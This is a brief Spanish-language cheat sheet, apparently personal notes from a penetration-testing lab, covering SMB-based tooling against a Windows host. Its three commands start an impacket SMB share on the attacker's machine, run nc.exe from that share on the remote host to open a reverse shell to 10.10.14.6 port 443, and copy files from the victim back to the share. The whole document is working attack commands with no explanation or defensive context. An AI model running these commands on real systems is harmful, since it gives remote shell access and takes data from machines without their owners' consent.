Montamos servidor SMB en local 
`impacket-smbserver smbFolder $(pwd) -smb2support`

Desde equipo remoto, hacer uso de nc.exe en el servidor SMB local para entablar una reverse shell
`\\10.10.14.6\smbFolder\nc.exe -e cmd 10.10.14.6 443`

Transferir fichero desde máquina remota a servidor SMB en local
`copy <fichero> \\10.10.14.6\smbFolder\<fichero>`